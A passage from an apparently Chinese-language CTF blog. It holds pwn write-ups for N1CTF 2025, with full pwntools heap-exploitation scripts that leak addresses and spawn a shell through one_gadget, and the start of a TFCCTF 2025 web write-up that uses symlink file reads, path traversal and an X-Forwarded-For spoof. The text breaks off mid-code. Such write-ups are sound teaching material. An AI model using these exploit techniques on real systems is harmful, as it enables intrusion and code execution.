<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xor = <span class="number">0x111111111111111</span></span><br><span class="line">validate = <span class="string">b&#x27;admin:&#x27;</span>+p64(xor)+<span class="string">b&#x27;:Junior:111111&#x27;</span></span><br></pre></td></tr></table></figure>

<style>.pmdrbwrmsfog{zoom:67%;}</style><img src="/2025/09/16/n1ctf-pwn/4893f3cf5d0d480a8e32d9a11b2bbc82.png" class="pmdrbwrmsfog">

<ol start="2">
<li><p>创建0x180的chunk存放note 结构体每个note大小为0x30，note结构：</p>
<style>.aawbubrneisb{}</style><img src="/2025/09/16/n1ctf-pwn/290fdb0b196e4d8a891ba30cab77f70e.png" class="aawbubrneisb">
</li>
<li><p>add，edit，delete，show操作</p>
</li>
</ol>
<h2 id="漏洞点："><a href="#漏洞点：" class="headerlink" title="漏洞点："></a>漏洞点：</h2><ol>
<li><p>editName中strlen可以用\x00绕过造成溢出</p>
</li>
<li><p>后门：remove操作中有一个一眼就很可疑的地方：lucky number，</p>
<style>.sprpykdhhmbm{}</style><img src="/2025/09/16/n1ctf-pwn/9b07c2893b9a413eab54aa77cdc96058.png" class="sprpykdhhmbm" alt="在这里插入图片描述">
<p>如果这里的if判断不通过，直接return，看反编译的伪代码不容易看出来，看汇编代码+动态调试可以发现<br>if判断的参数初始值为1，如果执行过一次editName操作以后，这个参数会自减一次，此时remove函数结束时会执行 ret lucyNumber操作<br><img src="https://i-blog.csdnimg.cn/direct/bef4e13f101042a9ac378f08379d482c.png" alt="[图片]"></p>
</li>
<li><p>这里的xor操作，其中的一个操作数是可控的，dest</p>
<style>.gxwfszoylvqc{}</style><img src="/2025/09/16/n1ctf-pwn/efc5f43229f54d76933b5a234281a226.png" class="gxwfszoylvqc"></li>
</ol>
<p><img src="/f46bbfaa51ec4ba798082ec1cc2ff78b.png"></p>
<h2 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h2><p>editName操作和show操作只能执行一次<br>利用xor操作构造任意地址读写条件泄露libc地址</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>第一阶段：<br>泄露heap基址和程序基址（PIE）<br>由于存在xor后的数据chunk的地址，结合动态调试，heap地址的后三字节是固定的，加上一字节的\x00溢出，<br>第一个note content chunk的起始地址为000+0x290（tcache bin管理结构）+0x190(note 结构体 chunk)&#x3D;0x420<br>如果控制xor的操作数后两位为20，且第二个note content chunk与第一个同处于0x400-0x4ff空间上，当使用editName方法溢出第二个结构体chunk的name，此时这两个结构体chunk的note content chunk就指向了同一个，此时就构造了一个UAF，可以泄露heap地址和程序地址（程序地址用BSS的chunkList的地址）<br>此时edit和show都用过一次不能再用了，很自然的就想到再执行一次main函数，将luckynumber设置为main addr<br>第二阶段：<br>上面只是思考过程，此时才发现：<br>在回顾一下heap的构造，结构体chunk有一部分也处0x400-0x4ff，再溢出一次name则xor结果末两位是00，此时xor第一个操作数末两位是什么（假如设置为0xmn），那么这个溢出的结构体的conten就会指向0x4mn，第一阶段的泄露操作也可以通过最后一个结构体chunk泄露</p>
<p>这时就可以show和修改最后一个struct chunk的data  content chunk的地址（要写入xor后的结果），将其指向got表结合show操作就可以泄露libc、heap、程序地址<br>最后将LUCKYNUMBER设置为onegadget即可</p>
<h2 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="keyword">global</span> libc</span><br><span class="line">    <span class="keyword">global</span> binary</span><br><span class="line">    <span class="keyword">global</span> elf</span><br><span class="line">    elf = ELF(binary, checksec=<span class="literal">False</span>)</span><br><span class="line">    libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>, checksec=<span class="literal">False</span>)  </span><br><span class="line">    xor = <span class="number">0x111111111111111</span></span><br><span class="line">    validate = <span class="string">b&#x27;admin:&#x27;</span>+p64(xor)+<span class="string">b&#x27;:Junior:111111&#x27;</span></span><br><span class="line">    sla(<span class="string">b&#x27;Do you want to play a game with me?\n&#x27;</span>,validate)</span><br><span class="line">    key_default = <span class="string">b&#x27;1&#x27;</span>*<span class="number">8</span></span><br><span class="line">    add(key_default,<span class="string">b&#x27;1&#x27;</span>,<span class="string">b&#x27;8&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    add(key_default,<span class="string">b&#x27;1&#x27;</span>,<span class="string">b&#x27;8&#x27;</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    add(key_default,<span class="string">b&#x27;1&#x27;</span>,<span class="string">b&#x27;8&#x27;</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    add(key_default,<span class="string">b&#x27;1&#x27;</span>,<span class="string">b&#x27;8&#x27;</span>,<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    add(key_default,<span class="string">b&#x27;1&#x27;</span>,<span class="string">b&#x27;8&#x27;</span>,<span class="string">b&#x27;e&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    add(key_default,<span class="string">b&#x27;1&#x27;</span>,<span class="string">b&#x27;8&#x27;</span>,<span class="string">b&#x27;f&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    add(key_default,<span class="string">b&#x27;1&#x27;</span>,<span class="string">b&#x27;8&#x27;</span>,<span class="string">b&#x27;g&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    remove(key_default,<span class="number">0</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    add(key_default,<span class="string">b&#x27;1&#x27;</span>,<span class="string">b&#x27;8&#x27;</span>,<span class="string">b&#x27;h&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    edit_name(key_default,<span class="number">7</span>,<span class="string">b&#x27;\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xf</span>))</span><br><span class="line">    show(key_default,<span class="number">7</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;content: &#x27;</span>)</span><br><span class="line">    heap_base = ((uu64(r(<span class="number">7</span>))&lt;&lt;<span class="number">8</span>)^xor)&gt;&gt;<span class="number">12</span>&lt;&lt;<span class="number">12</span></span><br><span class="line">    leak(<span class="string">&#x27;heap_base&#x27;</span>,heap_base)</span><br><span class="line">    proc_base = uu64(ru(<span class="string">&#x27;\n&#x27;</span>)) - <span class="number">0x4080</span> - <span class="number">0x7</span>*<span class="number">8</span></span><br><span class="line">    leak(<span class="string">&#x27;proc_base&#x27;</span>,proc_base)</span><br><span class="line">    main_sym = <span class="number">0x1CC7</span></span><br><span class="line">    ret_addr_in_remove = proc_base+main_sym</span><br><span class="line">    remove(key_default,<span class="number">1</span>,<span class="built_in">str</span>(ret_addr_in_remove))</span><br><span class="line">    sla(<span class="string">b&#x27;Do you want to play a game with me?\n&#x27;</span>,validate)</span><br><span class="line">    add(key_default,<span class="string">b&#x27;1&#x27;</span>,<span class="string">b&#x27;48&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    one_gadget_list = [<span class="number">0x583ec</span>,<span class="number">0x583f3</span>,<span class="number">0xef4ce</span>,<span class="number">0xef52b</span>]</span><br><span class="line">    one_gadget = one_gadget_list[<span class="number">3</span>]</span><br><span class="line">    edit_name(key_default,<span class="number">0</span>,<span class="string">b&#x27;\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xf</span>)+p64((proc_base+elf.got[<span class="string">&#x27;free&#x27;</span>])^xor))</span><br><span class="line">    show(key_default,<span class="number">0</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;content: &#x27;</span>)</span><br><span class="line">    free_addr = uu64(ru(<span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">    libc.address = free_addr - libc.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">    remove(key_default,<span class="number">1</span>,<span class="built_in">str</span>(libc.address+one_gadget))</span><br><span class="line">    <span class="keyword">return</span></span><br></pre></td></tr></table></figure>

<h1 id="近队容器的礼仪"><a href="#近队容器的礼仪" class="headerlink" title="近队容器的礼仪"></a>近队容器的礼仪</h1><h2 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h2><p>附件给出了pwn文件和libc文件夹，将libc.so.6和ld文件从libc文件夹中剪切出来，注意是剪切，确保libc文件夹中不再存在这两个文件，<br>直接运行使用：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-interpreter  ./ld-linux-x86-64.so.2 pwn</span><br><span class="line">patchelf --replace-needed libc.so.6  ./libc.so.6 pwn</span><br><span class="line">LD_LIBRARY_PATH=./libc pwn</span><br></pre></td></tr></table></figure>

<p>python中pwnlib调用：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 也需要先像上面的shell命令一样先patchelf</span></span><br><span class="line">binary = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">p = process(binary,env=&#123;<span class="string">&#x27;LD_PRELOAD&#x27;</span>:<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;LD_LIBRARY_PATH&#x27;</span>:<span class="string">&#x27;./libc/&#x27;</span>&#125;)</span><br><span class="line"><span class="comment"># 二选一即可</span></span><br><span class="line">gdbscript = <span class="string">&#x27;&#x27;</span></span><br><span class="line">p = gdb.debug(binary, gdbscript,env=&#123;<span class="string">&#x27;LD_LIBRARY_PATH&#x27;</span>:<span class="string">&#x27;./libc/&#x27;</span>&#125;)</span><br></pre></td></tr></table></figure>

<h2 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h2><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;1. Exit\n&#x27;</span><br><span class="line">b&#x27;2. Add deque to vector\n&#x27;</span><br><span class="line">b&#x27;3. Create Animal in deque\n&#x27;</span><br><span class="line">b&#x27;4. Remove deque from vector\n&#x27;</span><br><span class="line">b&#x27;5. Remove Animal from deque\n&#x27;</span><br><span class="line">b&#x27;6. Edit Animal in deque\n&#x27;</span><br><span class="line">b&#x27;7. Print Animal in deque\n&#x27;</span><br><span class="line">b&#x27;12. Create Animal in vector\n&#x27;</span><br><span class="line">b&#x27;13. Remove Animal from vector\n&#x27;</span><br><span class="line">b&#x27;14. Edit Animal in vector\n&#x27;</span><br><span class="line">b&#x27;15. Print Animal in vector\n&#x27;</span><br><span class="line">b&#x27;Enter your choice: &#x27;</span><br></pre></td></tr></table></figure>

<p>IDA的结果看起来太复杂了，先直接进行几次操作看看</p>
<p>先尝试下有没有UAF<br>结果一试还真有</p>
<h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><ol>
<li>刚刚提到的UAF，可以通过unsorted bin fd泄露libc和tcache bin fd泄露heap基址</li>
<li>堆溢出<br><img src="/8a19c192b90d42a38510052ff390ade9.png"><br>很明显看到有个堆溢出</li>
</ol>
<h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>先利用deque上的操作泄露地址<br>后用vector上的操作任意地址写（当时熬夜写的题，我也没去分析它到底能不能用deque的方法来，就是觉得给了这么多方法都用试试）<br>vecor申请的chunk结构是：一个0x20大小的结构体和对应size大小的animal，结构体中写着animal chunk的地址，因为能栈溢出，所以直接可以任意地址写<br>这里采取的操作时打enviorn打栈，从main的ret指令开始打；<br>算出environ到执行到main ret时栈地址的偏移量，然后构造栈满足ongadget的条件即可，也可以构造rop链<br>利用脚本<br>最后执行exit操作就可以执行到main的ret<br>注意执行execve的时候保证结尾是0x0而不是8吧，对齐一下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="keyword">global</span> libc</span><br><span class="line">    <span class="keyword">global</span> binary</span><br><span class="line">    <span class="keyword">global</span> elf</span><br><span class="line">    elf = ELF(binary, checksec=<span class="literal">False</span>)</span><br><span class="line">    libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    add_deque()</span><br><span class="line">    create_animal_deque(<span class="number">0</span>,<span class="number">0x80</span>)</span><br><span class="line">    show_animal_deque(<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">    ru(<span class="string">&#x27;): &#x27;</span>)</span><br><span class="line">    libc.address = uu64(ru(<span class="string">b&#x27;\n&#x27;</span>))-<span class="number">0x203b20</span></span><br><span class="line">    leak(<span class="string">&#x27;libc_base&#x27;</span>,libc.address)</span><br><span class="line">    <span class="comment"># 防止deque为空而不能show UAF</span></span><br><span class="line">    create_animal_deque(<span class="number">0</span>,<span class="number">0x80</span>)</span><br><span class="line">    malloc_hook = libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    leak(<span class="string">&#x27;__malloc_hook&#x27;</span>,malloc_hook)</span><br><span class="line">    one_gadget_list = [<span class="number">0x583ec</span>,<span class="number">0x583f3</span>,<span class="number">0xef4ce</span>,<span class="number">0xef52b</span>]</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;    0xef52b execve(&quot;/bin/sh&quot;, rbp-0x50, [rbp-0x78])</span></span><br><span class="line"><span class="string">    constraints:</span></span><br><span class="line"><span class="string">    address rbp-0x50 is writable</span></span><br><span class="line"><span class="string">    rax == NULL || &#123;&quot;/bin/sh&quot;, rax, NULL&#125; is a valid argv</span></span><br><span class="line"><span class="string">    [[rbp-0x78]] == NULL || [rbp-0x78] == NULL || [rbp-0x78] is a valid envp&#x27;&#x27;&#x27;</span></span><br><span class="line">    one_gadget =libc.address + one_gadget_list[<span class="number">3</span>]</span><br><span class="line">    system_addr = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    environ =  libc.symbols[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line">    create_animal_vector(<span class="number">0x90</span>)    </span><br><span class="line">    create_animal_vector(<span class="number">0x90</span>)</span><br><span class="line">    edit_animal_vector(<span class="number">0</span>,<span class="number">0x90</span>+<span class="number">0x20</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x90</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>) + p64(environ))</span><br><span class="line">    show_animal_vector(<span class="number">1</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;): &#x27;</span>)</span><br><span class="line">    environ_addr = uu64(ru(<span class="string">b&#x27;\n&#x27;</span>))</span><br><span class="line">    edit_animal_vector(<span class="number">0</span>,<span class="number">0x90</span>+<span class="number">0x20</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x90</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>) + p64(environ_addr-<span class="number">0x30</span>))</span><br><span class="line">    show_animal_vector(<span class="number">1</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;): &#x27;</span>)</span><br><span class="line">    start_addr = uu64(ru(<span class="string">b&#x27;\n&#x27;</span>)) - <span class="number">37</span></span><br><span class="line">    proc_base = start_addr - elf.sym[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    ret_of_main = environ_addr - <span class="number">0x130</span></span><br><span class="line">    ret_addr = proc_base+<span class="number">0x101a</span></span><br><span class="line"></span><br><span class="line">    edit_animal_vector(<span class="number">0</span>,<span class="number">0x90</span>+<span class="number">0x20</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x90</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>) + p64(ret_of_main))</span><br><span class="line">    edit_animal_vector(<span class="number">1</span>,<span class="number">0x8</span>,p64(ret_addr))</span><br><span class="line"></span><br><span class="line">    edit_animal_vector(<span class="number">0</span>,<span class="number">0x90</span>+<span class="number">0x20</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x90</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>) + p64(ret_of_main+<span class="number">8</span>))</span><br><span class="line">    edit_animal_vector(<span class="number">1</span>,<span class="number">0x8</span>,p64(one_gadget))</span><br><span class="line"></span><br><span class="line">    edit_animal_vector(<span class="number">0</span>,<span class="number">0x90</span>+<span class="number">0x20</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x90</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>) + p64(environ_addr-<span class="number">0x110</span>))</span><br><span class="line">    edit_animal_vector(<span class="number">1</span>,<span class="number">0x8</span>,p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">    edit_animal_vector(<span class="number">0</span>,<span class="number">0x90</span>+<span class="number">0x20</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x90</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>) + p64(environ_addr-<span class="number">0xe8</span>))</span><br><span class="line">    edit_animal_vector(<span class="number">1</span>,<span class="number">0x8</span>,p64(<span class="number">0</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># exit 推出时会执行ret of main</span></span><br><span class="line">    sla(<span class="string">b&#x27;Enter your choice:&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span></span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/09/16/n1ctf-pwn/" data-id="cuidlH2teuA6txmHVyAcynOGJ" data-title="n1ctf2025_pwn" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-TFCCTF2025" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/09/02/TFCCTF2025/" class="article-date">
  <time class="dt-published" datetime="2025-09-02T13:53:05.000Z" itemprop="datePublished">2025-09-02</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/09/02/TFCCTF2025/">TFCCTF2025 web</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h3 id="SLIPPY"><a href="#SLIPPY" class="headerlink" title="SLIPPY"></a>SLIPPY</h3><p><strong>一、题目描述</strong></p>
<p>打开靶机，可以上传ZIP压缩包，系统尝试解压并将成功解压的文件放置在 upload&#x2F; 目录下，供用户下载</p>
<style>.ejmdnvpuwrnk{zoom: 80%;}</style><img src="/2025/09/02/TFCCTF2025/image-20250901091932761.png" class="ejmdnvpuwrnk" alt="image-20250901091932761">

<p>根据Dockerfile，FLAG 存放在 &#x2F;xxxxxxx&#x2F;flag.txt下</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RUN rand_dir=&quot;/$(head /dev/urandom | tr -dc a-z0-9 | head -c 8)&quot;; mkdir &quot;$rand_dir&quot; &amp;&amp; echo &quot;TFCCTF&#123;Fake_fLag&#125;&quot; &gt; &quot;$rand_dir/flag.txt&quot; &amp;&amp; chmod -R +r &quot;$rand_dir&quot;</span><br></pre></td></tr></table></figure>

<p><strong>二、题目分析</strong></p>
<p>调试环境：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动 docker</span></span><br><span class="line">docker run -it -p 3000:3000 -p 9229:9229 slippy node --inspect-brk=0.0.0.0:9229 server.js</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">访问chrome://inspect</span></span><br></pre></td></tr></table></figure>

<p>查看源码，分析相关处理逻辑</p>
<p>upload上传文件之后，通过<code>unzip</code>命令解压，然后存放在 <code>upload/session_userid/</code> 目录下</p>
<p>可能存在软链接读取文件，不存在zip slip路径穿越漏洞</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/upload&#x27;</span>, upload.<span class="title function_">single</span>(<span class="string">&#x27;zipfile&#x27;</span>), <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> zipPath = req.<span class="property">file</span>.<span class="property">path</span>;      <span class="comment">// 上传文件暂存目录</span></span><br><span class="line">    <span class="comment">// 拼接解压缩的目标路径 upload/xxxxxxx</span></span><br><span class="line">    <span class="keyword">const</span> userDir = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;../uploads&#x27;</span>, req.<span class="property">session</span>.<span class="property">userId</span>);   </span><br><span class="line">     <span class="comment">// Command: unzip temp/file.zip -d target_dir</span></span><br><span class="line">    <span class="title function_">execFile</span>(<span class="string">&#x27;unzip&#x27;</span>, [zipPath, <span class="string">&#x27;-d&#x27;</span>, userDir], <span class="function">(<span class="params">err, stdout, stderr</span>) =&gt;</span> &#123;</span><br><span class="line">      fs.<span class="title function_">unlinkSync</span>(zipPath); <span class="comment">// Clean up temp file</span></span><br><span class="line">      <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Unzip failed:&#x27;</span>, stderr);</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Unzip error&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      res.<span class="title function_">redirect</span>(<span class="string">&#x27;/files&#x27;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>

<p>验证发现，此处通过软链接可以读取任意文件内容。可以通过软链接flag.txt，但不知道flag文件存在的目录</p>
<p>查看其它处理代码，访问 <code>/debug/files</code> 时，相关的处理代码存在路径穿越漏洞</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/debug/files&#x27;</span>, developmentOnly, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// session_id 存在路径穿越，可以获取任意目录下的文件列表</span></span><br><span class="line">    <span class="keyword">const</span> userDir = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;../uploads&#x27;</span>, req.<span class="property">query</span>.<span class="property">session_id</span>);</span><br><span class="line">    fs.<span class="title function_">readdir</span>(userDir, <span class="function">(<span class="params">err, files</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Error reading files&#x27;</span>);</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;files&#x27;</span>, &#123; files &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>但是访问该 <code>url</code> 需要先通过 <code>developmentOnly()</code> 方法的认证，条件时 <code>userId === ‘develop’</code> ，且 <code>req.ip == ‘127.0.0.1’</code></p>
<p>后者通过修改 <code>X-Forwarded-For</code> 可以满足，下面分析 <code>userId === ‘develop’</code> 的问题</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="keyword">function</span> (<span class="params">req, res, next</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">userId</span> === <span class="string">&#x27;develop&#x27;</span> &amp;&amp; req.<span class="property">ip</span> == <span class="string">&#x27;127.0.0.1&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="title function_">next</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&#x27;Forbidden: Development access only&#x27;</span>);</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure>

<p>调试发现，<code>userId</code>是一串随机字符</p>
<p><img src="/image-20250901100930140.png" alt="image-20250901100930140"></p>
<p>发现 server.js 中有存放 develop 的sessionData：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Session</span></span><br><span class="line"><span class="keyword">const</span> store = <span class="keyword">new</span> session.<span class="title class_">MemoryStore</span>();</span><br><span class="line"><span class="keyword">const</span> sessionData = &#123;</span><br><span class="line">    <span class="attr">cookie</span>: &#123;</span><br><span class="line">      <span class="attr">path</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">      <span class="attr">httpOnly</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">maxAge</span>: <span class="number">1000</span> * <span class="number">60</span> * <span class="number">60</span> * <span class="number">48</span> <span class="comment">// 1 hour</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">userId</span>: <span class="string">&#x27;develop&#x27;</span>   <span class="comment">// 用户名为 develop</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// store.set 保存sessionData的值</span></span><br><span class="line">store.<span class="title function_">set</span>(<span class="string">&#x27;&lt;REDACTED&gt;&#x27;</span>, sessionData, <span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Failed to create develop session:&#x27;</span>, err);</span><br><span class="line">    <span class="keyword">else</span> <span class="variable language_">console</span>.<span class="title 